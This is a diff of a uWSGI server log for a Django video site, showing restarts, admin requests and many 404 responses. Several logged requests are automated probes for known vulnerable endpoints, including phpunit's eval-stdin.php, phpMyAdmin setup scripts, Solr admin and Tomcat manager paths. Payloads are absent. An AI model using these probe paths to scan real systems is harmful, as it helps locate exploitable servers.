+[pid: 10432|app: 0|req: 1048/1400] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 04:53:29 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1049/1401] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 04:55:30 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1050/1402] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 04:57:30 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1051/1403] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 04:59:31 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1052/1404] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:01:31 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1053/1405] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:03:31 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1054/1406] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:05:32 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1055/1407] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:07:32 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1056/1408] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:09:33 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1057/1409] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:11:33 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1058/1410] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:13:34 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1059/1411] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:15:34 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1060/1412] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:17:35 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1061/1413] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:19:35 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1062/1414] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:21:35 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1063/1415] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:23:36 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1064/1416] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:25:36 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1065/1417] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:27:37 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1066/1418] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:29:37 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1067/1419] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:31:38 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1068/1420] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:33:38 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1069/1421] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:35:38 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1070/1422] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:37:39 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1071/1423] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:39:39 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1072/1424] 195.54.160.135 () {38 vars in 712 bytes} [Mon Jun 22 05:39:58 2020] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1073/1425] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:41:40 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1074/1426] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:43:40 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1075/1427] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:45:41 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1076/1428] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:47:41 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1077/1429] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:49:42 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1078/1430] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 05:51:42 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1079/1431] 182.254.52.17 () {36 vars in 592 bytes} [Mon Jun 22 06:22:41 2020] GET /dbadmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1080/1432] 182.254.52.17 () {36 vars in 542 bytes} [Mon Jun 22 07:17:28 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1081/1433] 182.254.52.17 () {36 vars in 588 bytes} [Mon Jun 22 07:33:47 2020] GET /mysql/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1082/1434] 205.185.114.231 () {40 vars in 630 bytes} [Mon Jun 22 07:46:18 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1083/1435] 185.107.80.62 () {34 vars in 393 bytes} [Mon Jun 22 08:15:32 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1084/1436] 177.87.12.66 () {32 vars in 462 bytes} [Mon Jun 22 08:17:11 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1085/1437] 183.136.225.57 () {34 vars in 456 bytes} [Mon Jun 22 10:02:49 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1086/1438] 205.185.114.231 () {40 vars in 630 bytes} [Mon Jun 22 10:24:04 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1087/1439] 182.254.52.17 () {36 vars in 540 bytes} [Mon Jun 22 10:27:32 2020] GET /phpadmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1088/1440] 182.254.52.17 () {36 vars in 594 bytes} [Mon Jun 22 10:49:19 2020] GET /sqladmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1089/1441] 223.71.167.163 () {34 vars in 459 bytes} [Mon Jun 22 11:19:49 2020] GET / => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1090/1442] 162.243.137.90 () {34 vars in 428 bytes} [Mon Jun 22 12:37:54 2020] GET /manager/text/list => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1091/1443] 182.254.52.17 () {36 vars in 546 bytes} [Mon Jun 22 12:45:35 2020] GET /phpmyadmin2/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1092/1444] 182.254.52.17 () {36 vars in 546 bytes} [Mon Jun 22 13:26:50 2020] GET /phpmyadmin1/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1093/1445] 103.69.45.194 () {32 vars in 463 bytes} [Mon Jun 22 13:47:19 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1094/1446] 61.241.50.63 () {36 vars in 607 bytes} [Mon Jun 22 14:34:46 2020] GET /phpmyadmin/scripts/db___.init.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1095/1447] 101.89.19.140 () {36 vars in 560 bytes} [Mon Jun 22 14:57:49 2020] GET /setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1096/1448] 88.135.114.74 () {32 vars in 464 bytes} [Mon Jun 22 15:11:30 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1097/1449] 182.254.52.17 () {36 vars in 594 bytes} [Mon Jun 22 17:02:47 2020] GET /phpAdmin/scripts/setup.php => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1098/1450] 95.107.57.198 () {32 vars in 464 bytes} [Mon Jun 22 17:25:29 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1099/1451] 14.18.182.223 () {36 vars in 605 bytes} [Mon Jun 22 17:40:24 2020] GET /?XDEBUG_SESSION_START%3Dphpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1100/1452] 182.254.52.17 () {36 vars in 594 bytes} [Mon Jun 22 18:10:33 2020] GET /video/play/84919/1-16.html => generated 15948 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1101/1453] 138.97.192.242 () {32 vars in 464 bytes} [Mon Jun 22 18:15:26 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1102/1454] 182.254.52.17 () {36 vars in 542 bytes} [Mon Jun 22 18:47:36 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1103/1455] 58.19.100.251 () {44 vars in 867 bytes} [Mon Jun 22 18:49:55 2020] GET /video/play/82978/1-39.html => generated 19554 bytes in 8 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1104/1456] 182.254.52.17 () {36 vars in 566 bytes} [Mon Jun 22 19:45:12 2020] GET /KingViewWeb/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1105/1457] 182.254.52.17 () {36 vars in 605 bytes} [Mon Jun 22 19:58:10 2020] GET /solr/admin/info/system?wt%3Djson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1106/1458] 182.254.52.17 () {36 vars in 576 bytes} [Mon Jun 22 19:59:05 2020] GET /scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1107/1459] 182.254.52.17 () {36 vars in 542 bytes} [Mon Jun 22 20:05:32 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1108/1460] 182.254.52.17 () {36 vars in 594 bytes} [Mon Jun 22 20:15:34 2020] GET /video/play/84919/1-15.html => generated 15948 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1109/1461] 103.139.11.187 () {32 vars in 465 bytes} [Mon Jun 22 21:56:39 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1110/1462] 113.69.34.142 () {46 vars in 906 bytes} [Mon Jun 22 21:58:05 2020] GET /video/ => generated 59370 bytes in 10149 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1111/1463] 113.69.34.142 () {46 vars in 906 bytes} [Mon Jun 22 21:58:21 2020] GET /video/ => generated 59545 bytes in 878 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1112/1464] 113.69.34.142 () {48 vars in 928 bytes} [Mon Jun 22 21:58:56 2020] GET /video/ => generated 59545 bytes in 412 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1113/1465] 113.69.34.142 () {46 vars in 906 bytes} [Mon Jun 22 21:59:37 2020] GET /video/ => generated 59545 bytes in 423 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1114/1466] 5.202.144.10 () {32 vars in 462 bytes} [Mon Jun 22 22:06:18 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 1115/1467] 182.254.52.17 () {36 vars in 605 bytes} [Mon Jun 22 22:50:27 2020] GET /sql/sqladmin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 121/1468] 182.254.52.17 () {36 vars in 609 bytes} [Mon Jun 22 22:50:30 2020] GET /admin/sysadmin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10431|app: 0|req: 135/1469] 182.254.52.17 () {36 vars in 595 bytes} [Mon Jun 22 22:50:37 2020] GET /PMA2020/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 1116/1470] 182.254.52.17 () {36 vars in 597 bytes} [Mon Jun 22 22:55:57 2020] GET /db/webdb/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ubuntu/git/django_project
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 6 mapped to socket 0 (127.0.0.1:8001)
+running /home/ubuntu/.local/bin/uwsgi
+[uWSGI] getting INI configuration from /home/ubuntu/git/django_project/web.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Jun 22 23:01:43 2020] ***
 compiled with version: 7.4.0 on 31 January 2020 10:32:09
 os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
 nodename: VM-32-8-ubuntu
@@ -208,7 +239,6 @@ machine: x86_64
 clock source: unix
 detected number of CPU cores: 1
 current working directory: /home/ubuntu/git/django_project
-writing pidfile to ./uwsgi.pid
 detected binary path: /home/ubuntu/.local/bin/uwsgi
 !!! no internal routing support, rebuild with pcre support !!!
 chdir() to /home/ubuntu/git/django_project
@@ -217,32 +247,18 @@ your memory page size is 4096 bytes
 detected max file descriptor number: 1024
 lock engine: pthread robust mutexes
 thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to TCP address 127.0.0.1:8001 fd 6
+uwsgi socket 0 inherited INET address 127.0.0.1:8001 fd 6
 Python version: 3.6.8 (default, Oct  7 2019, 12:59:55)  [GCC 8.3.0]
-Python main interpreter initialized at 0x562ae7a54570
+Python main interpreter initialized at 0x55f419ef83e0
 python threads support enabled
 your server socket listen backlog is limited to 100 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 416720 bytes (406 KB) for 8 cores
 *** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x562ae7a54570 pid: 24986 (default app)
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55f419ef83e0 pid: 10424 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 24986)
-spawned uWSGI worker 1 (pid: 25000, cores: 2)
-spawned uWSGI worker 2 (pid: 25001, cores: 2)
-spawned uWSGI worker 3 (pid: 25002, cores: 2)
-spawned uWSGI worker 4 (pid: 25003, cores: 2)
-[pid: 25001|app: 0|req: 1/1] 113.69.35.228 () {46 vars in 922 bytes} [Wed Jun 10 23:19:45 2020] GET /admin/view_log/?page=1 => generated 0 bytes in 171 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 0)
-[pid: 25001|app: 0|req: 2/2] 113.69.35.228 () {46 vars in 911 bytes} [Wed Jun 10 23:19:45 2020] GET /admin/login.html => generated 5348 bytes in 16 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 1)
-[pid: 25000|app: 0|req: 1/3] 113.69.35.228 () {52 vars in 1013 bytes} [Wed Jun 10 23:19:51 2020] POST /admin/login.html => generated 63 bytes in 153 msecs (HTTP/1.1 200) 6 headers in 294 bytes (1 switches on core 0)
-[pid: 25000|app: 0|req: 2/4] 113.69.35.228 () {46 vars in 929 bytes} [Wed Jun 10 23:19:52 2020] GET /admin/ => generated 30034 bytes in 15 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
-————————开始获取豆瓣id数据————————
-无豆瓣id的视频总数：6460
-无匹配视频总数：2430
-重复数据的视频总数：553
-[pid: 25000|app: 0|req: 6/8] 113.69.35.228 () {46 vars in 867 bytes} [Wed Jun 10 23:19:55 2020] GET /admin/get_rating/ => generated 4 bytes in 8300 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 0)
-[pid: 25000|app: 0|req: 7/9] 113.69.35.228 () {46 vars in 937 bytes} [Wed Jun 10 23:20:03 2020] GET /admin/ => generated 30034 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
-管理员设置：0
-[pid: 25000|app: 0|req: 8/10] 113.69.35.228 () {46 vars in 888 bytes} [Wed Jun 10 23:20:05 2020] GET /admin/set_admin_flag/?flag=0 => generated 4 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 0)
-[pid: 25000|app: 0|req: 9/11] 113.69.35.228 () {46 vars in 937 bytes} [Wed Jun 10 23:20:06 2020] GET /admin/view_log/ => generated 22386 bytes in 2351 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
-[pid: 25000|app: 0|req: 10/12] 113.69.35.228 () {46 vars in 965 bytes} [Wed Jun 10 23:20:11 2020] GET /admin/view_log/?page=1018 => generated 16934 bytes in 2316 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+gracefully (RE)spawned uWSGI master process (pid: 10424)
+spawned uWSGI worker 1 (pid: 21620, cores: 2)
+spawned uWSGI worker 2 (pid: 21621, cores: 2)
+spawned uWSGI worker 3 (pid: 21622, cores: 2)
+spawned uWSGI worker 4 (pid: 21623, cores: 2)
